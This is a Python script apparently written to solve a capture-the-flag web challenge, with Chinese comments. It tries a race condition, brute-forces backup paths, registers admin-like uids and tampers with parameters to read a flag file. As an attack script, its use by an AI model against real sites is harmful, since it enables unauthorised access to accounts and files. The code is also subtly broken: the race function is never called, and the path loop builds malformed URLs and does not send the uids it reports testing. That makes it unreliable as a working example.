#!/usr/bin/env python3
import requests
import threading
import sys
import time

url = "http://8080-26908653-7324-41e9-98cb-8f7c72ff8626.challenge.ctfplus.cn/"

print("[*] Testing Race Condition on /backup endpoint (if exists)")
print()

# 场景1: 注册管理员UID的同时请求备份
def race_attack_1():
    print("\n[Scenario 1] Register admin + immediate backup requests")
    
    # 多个线程同时请求backup
    def send_backup():
        try:
            r = requests.get(url + '?uid=admin', timeout=10)
            print(f"  Backup request - Status: {r.status_code}, Length: {len(r.text)}")
            if 'flag' in r.text.lower():
                print(f"  *** FLAG FOUND: {r.text} ***")
                sys.exit(0)
            elif len(r.text) > 100:
                print(f"  Response: {r.text[:500]}")
        except Exception as e:
            print(f"  Error: {e}")
    
    threads = []
    for i in range(20):  # 同时发送20个请求
        t = threading.Thread(target=send_backup)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

# 场景2: 探索可能的备份接口路径
print("\n[Scenario 2] Brute forcing backup paths")
backup_paths = [
    '/backup',
    '/backup?uid=admin',
    '/backup?uid=root',
    '/backup?uid=0',
    '/backup?uid=admin&file=flag.txt',
    '/backup?uid=admin&filename=flag',
    '/download',
    '/download?uid=admin',
    '/read',
    '/read?uid=admin',
    '/readfile',
    '/readfile?uid=admin',
    '/api/backup',
    '/api/backup?uid=admin',
    '/internal/backup',
    '/admin/backup',
    '/backup/admin',
    '/get_backup'
]

for path in backup_paths:
    for uid in ['admin', 'root', '0', '1']:
        try:
            test_url = url + path if '?' not in path else path + f'?uid={uid}'
            r = requests.get(test_url, timeout=5)
            print(f"  GET {path}?uid={uid} - Status: {r.status_code}")
            if r.status_code == 200 and len(r.text) > 100:
                print(f"  Response: {r.text[:500]}")
                if 'flag' in r.text.lower():
                    print(f"  *** FLAG FOUND: {r.text} ***")
                    sys.exit(0)
        except Exception as e:
            pass

# 场景3: 测试不同UID注册后的权限
print("\n[Scenario 3] Testing different UID registration + immediate action")
uids_to_test = ['admin', 'root', 'administrator', '0', '1', '-1', 'true', 'false']

for uid_value in uids_to_test:
    print(f"\n[*] Testing UID: {uid_value}")
    
    # 注册
    try:
        r = requests.post(url + 'register', 
                              data={'uid': uid_value, 'username': f'test{uid_value}', 'password': 'pass'}, 
                              timeout=5)
        if r.status_code == 200:
            print(f"  ✓ Registered {uid_value}")
            
            # 立即请求备份
            try:
                r2 = requests.get(url + '?uid=' + uid_value, timeout=5)
                print(f"  Backup - Status: {r2.status_code}")
                if r2.status_code == 200:
                    if 'flag' in r2.text.lower():
                        print(f"  *** FLAG FOUND: {r2.text} ***")
                        sys.exit(0)
                    elif len(r2.text) < 200:
                        print(f"  Response: {r2.text[:800]}")
            except Exception as e:
                print(f"  Backup error: {e}")
    except Exception as e:
        print(f"  Registration error: {e}")

# 场景4: 测试POST到backup
print("\n[Scenario 4] Testing POST to backup endpoints")
for uid in ['admin', 'root']:
    try:
        r = requests.post(url + 'backup', data={'uid': uid}, timeout=5)
        print(f"  POST /backup with uid={uid} - Status: {r.status_code}")
        if r.status_code == 200:
            if 'flag' in r.text.lower():
                print(f"  *** FLAG FOUND: {r.text} ***")
                sys.exit(0)
            print(f"  Response: {r.text[:500]}")
    except Exception as e:
        print(f"  Error: {e}")

# 场景5: 测试带不同参数的请求
print("\n[Scenario 5] Testing various parameter combinations")
params_combinations = [
    {'uid': 'admin', 'file': '/flag'},
    {'uid': 'admin', 'path': '/flag'},
    {'uid': 'admin', 'filename': 'flag'},
    {'uid': 'admin', 'f': 'flag'},
    {'uid': 'root', 'file': '/flag'},
]

for params in params_combinations:
    try:
        r = requests.get(url + 'backup', params=params, timeout=5)
        print(f"  GET /backup with {params} - Status: {r.status_code}")
        if r.status_code == 200:
            if 'flag' in r.text.lower():
                print(f"  *** FLAG FOUND: {r.text} ***")
                sys.exit(0)
            elif len(r.text) > 200:
                print(f"  Response length: {len(r.text)} - Content: {r.text[:300]}")
    except Exception as e:
        pass

print()
print("[*] Testing complete. If no flag found, the race condition might need timing or more info.")
